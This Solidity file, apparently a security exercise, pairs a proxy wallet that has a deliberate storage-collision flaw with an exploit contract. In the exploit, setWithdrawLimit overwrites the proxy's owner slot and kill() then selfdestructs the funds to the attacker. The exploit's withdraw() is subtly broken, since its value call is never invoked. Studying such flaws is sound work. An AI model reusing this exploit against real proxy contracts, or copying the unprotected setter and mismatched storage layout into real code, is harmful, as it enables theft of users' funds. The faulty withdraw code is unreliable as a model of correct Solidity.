// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract BurnerWallet {
    address public implementation;
    address payable public owner;

    constructor(address _implementation) {
        implementation = _implementation;
        owner = payable(msg.sender);
    }

    fallback() external payable {
        (bool executed, ) = implementation.delegatecall(msg.data);
        require(executed, "failed");
    }

    function kill() external {
        require(msg.sender == owner, "not owner");
        selfdestruct(owner);
        // (bool success, ) = address(owner).call{ value: address(this).balance }("");
        // require(success);
    }
}

contract BurnerWalletImplementation {
    address public implementation;
    uint public limit;
    address payable public owner;

    receive() external payable {}

    modifier onlyOwner() {
        require(msg.sender == owner, "!owner");
        _;
    }

    function setWithdrawLimit(uint _limit) external {
        limit = _limit;
    }

    function withdraw() external onlyOwner {
        uint amount = address(this).balance;
        if (amount > limit) {
            amount = limit;
        }
        owner.transfer(amount);
    }
}

interface IBurnerWallet {
    function setWithdrawLimit(uint limit) external;

    function kill() external ;
}

contract BurnerWalletExploit {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function pwn() external {
        // set owner to this contract
        IBurnerWallet(target).setWithdrawLimit(uint(uint160(address(this))));
        // kill to drain wallet
        IBurnerWallet(target).kill();
    }

    function withdraw() external {
        payable(msg.sender).call{ value: address(this).balance };
    }
}
